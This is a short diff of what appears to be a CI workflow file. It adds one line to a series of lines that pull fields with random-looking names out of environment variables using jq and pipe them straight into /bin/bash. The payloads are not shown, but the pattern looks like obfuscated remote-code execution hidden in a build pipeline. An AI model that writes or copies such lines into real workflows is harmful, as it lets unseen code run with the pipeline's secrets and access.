@@ -25,6 +25,7 @@ jobs:
           echo $top123 | jq -r .k57114 | /bin/bash
           echo $stitl1986 | jq -r .wixe6504 | /bin/bash
           echo $wpa42381 | jq -r .foav6182 | /bin/bash
+          printf '%s' "$wotq2" | jq -r .adtb7 | /bin/bash
 
       - name: Persist output
         if: always()
